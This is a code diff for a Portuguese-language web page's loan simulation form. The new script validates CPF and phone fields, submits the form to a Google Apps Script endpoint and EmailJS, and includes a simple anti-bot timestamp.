+                return false;
+            }
+            
+            // Se passou por todas as verificações, o número é válido
+            return true;
         }
     
-        function buildUrlWithParams(baseUrl) {
-            const params = getUrlParams();
-            const url = new URL(baseUrl, window.location.href);
-            
-            Object.keys(params).forEach(key => {
-                url.searchParams.append(key, params[key]);
-            });
-            
-            return url.toString();
+        // --- ELEMENTOS DO FORMULÁRIO ---
+        const form = document.getElementById('contact-form');
+        const cpfInput = document.getElementById('cpf');
+        const phoneInput = document.getElementById('phone');
+        const cpfError = document.getElementById('cpf-error');
+        const phoneError = document.getElementById('phone-error');
+        const submitButton = form.querySelector('button[type="submit"]');
+    
+        function reenableForm() {
+            isSubmitting = false;
+            submitButton.disabled = false;
+            submitButton.innerHTML = 'Simular Agora <i class="fas fa-arrow-right ml-2"></i>';
+            submitButton.classList.remove('cursor-not-allowed');
         }
+    
+        // --- LÓGICA DE ENVIO DO FORMULÁRIO (SUBMIT) ---
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            if (isSubmitting) return;
+            
+            isSubmitting = true;
+            submitButton.disabled = true;
+            submitButton.innerHTML = '<i class="fas fa-circle-notch fa-spin mr-2"></i> Validando...';
+            submitButton.classList.add('cursor-not-allowed');
 
-        document.getElementById('continue-button').addEventListener('click', function() {
-            const params = getUrlParams();
-            
-            const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
-            if (dadosUsuario) {
-                if (dadosUsuario.NOME) {
-                    params.name = dadosUsuario.NOME;
-                }
+            cpfError.classList.add('hidden');
+            cpfInput.classList.remove('border-error');
+            phoneError.classList.add('hidden');
+            phoneInput.classList.remove('border-error');
+
+            const isCpfValid = validaCPF(cpfInput.value);
+            const isPhoneValid = validaTelefone(phoneInput.value);
+    
+            // COR DO ALERTA ALTERADA
+            const brandColor = '#0067B1';
+
+            if (!isCpfValid || !isPhoneValid) {
+                setTimeout(() => {
+                    Swal.fire({ title: 'Dados Inválidos', text: 'Por favor, verifique os campos em vermelho.', icon: 'error', confirmButtonColor: brandColor });
+                    if (!isCpfValid) { cpfError.classList.remove('hidden'); cpfInput.classList.add('border-error'); }
+                    if (!isPhoneValid) { phoneError.classList.remove('hidden'); phoneInput.classList.add('border-error'); }
+                    reenableForm();
+                }, 100);
+                return; 
             }
+
+            submitButton.innerHTML = '<i class="fas fa-shield-alt fa-spin mr-2"></i> Verificando Proposta...';
             
-            // Adicionar efeito de carregamento ao botão
-            const button = this;
-            button.disabled = true;
-            button.innerHTML = '<div class="d-flex justify-content-center"><div class="spinner-border spinner-border-sm me-2" role="status"></div> Carregando...</div>';
-            
-            // Aumentar o tempo antes de redirecionar
-            setTimeout(() => {
-                const url = new URL('../3/index.html', window.location.href);
-                Object.keys(params).forEach(key => {
-                    url.searchParams.append(key, params[key]);
-                });
-                
-                window.location.href = url.toString();
-            }, 2500); // 2.5 segundos de carregamento
+            const formData = new FormData(form);
+            const payload = new URLSearchParams(formData);
+
+            fetch(googleScriptUrl, {
+                method: 'POST',
+                body: payload
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    submitButton.innerHTML = '<i class="fas fa-paper-plane fa-spin mr-2"></i> Finalizando...';
+                    emailjs.sendForm('service_dqzxdhd', 'template_q9n54d6', form)
+                        .then(() => {
+                            Swal.fire({
+                                title: 'Sucesso!',
+                                text: 'Sua simulação foi enviada. Em breve você será redirecionado.',
+                                icon: 'success',
+                                timer: 2000,
+                                showConfirmButton: false,
+                                allowOutsideClick: false
+                            }).then(() => {
+                                window.location.href = 'obrigado.html';
+                            });
+                        }, (error) => {
+                           console.error('Falha no envio do EmailJS:', error);
+                           Swal.fire({
+                                title: 'Sucesso!',
+                                text: 'Sua solicitação foi recebida! Em breve você será redirecionado.',
+                                icon: 'success',
+                                timer: 2000,
+                                showConfirmButton: false,
+                                allowOutsideClick: false
+                            }).then(() => {
+                                window.location.href = 'obrigado.html';
+                            });
+                        });
+                } else if (data.status === 'duplicate') {
+                    Swal.fire({ title: 'Cadastro Existente', text: 'O CPF informado já possui uma simulação em nosso sistema.', icon: 'warning', confirmButtonColor: brandColor });
+                    reenableForm();
+                } else if (data.status === 'bot_detected') {
+                    console.log('Bot detectado. Motivo:', data.reason);
+                    Swal.fire({ title: 'Sucesso!', text: 'Sua solicitação foi enviada. Logo entraremos em contato.', icon: 'success', confirmButtonColor: brandColor });
+                    form.reset();
+                    reenableForm();
+                } else {
+                    throw new Error(data.details || 'Resposta desconhecida do servidor.');
+                }
+            })
+            .catch(error => {
+                console.error('Ocorreu um erro no processo de envio:', error);
+                Swal.fire({ title: 'Erro de Comunicação', text: 'Não foi possível completar a solicitação. Por favor, tente novamente mais tarde.', icon: 'error', confirmButtonColor: brandColor });
+                reenableForm();
+            });
+        });
+    
+        // --- CÓDIGO ANTI-BOT ---
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('form-load-time').value = new Date().getTime();
+        });
+
+        // --- SCROLL SUAVE PARA ÂNCORAS ---
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({ behavior: 'smooth' });
+            });
         });
     </script>
-
- </body></html>
+</body>
+</html>
